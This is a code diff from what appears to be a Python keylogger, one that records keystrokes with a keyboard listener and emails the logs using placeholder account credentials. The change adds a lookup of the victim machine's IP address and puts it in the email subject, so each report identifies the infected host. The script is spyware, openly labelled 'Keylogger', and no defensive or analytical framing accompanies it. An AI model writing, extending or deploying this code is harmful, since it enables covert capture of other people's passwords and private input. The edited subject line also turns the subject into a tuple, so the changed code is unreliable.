@@ -6,6 +6,9 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 import os
+import socket
+
+myip = socket.gethostbyname(socket.gethostname())
 
 log_dir = ""
 
@@ -27,7 +30,7 @@ with Listener(on_press=on_press) as listener:
 email_user = 'Votre E-mail / Your E-mail'
 email_send = 'Votre E-mail / Your E-mail'
 email_password = 'Votre Mot de Passe / Your password'
-subject = 'Keylogger'
+subject = 'Keylogger', myip
 
 msg = MIMEMultipart()
 msg['From'] = email_user
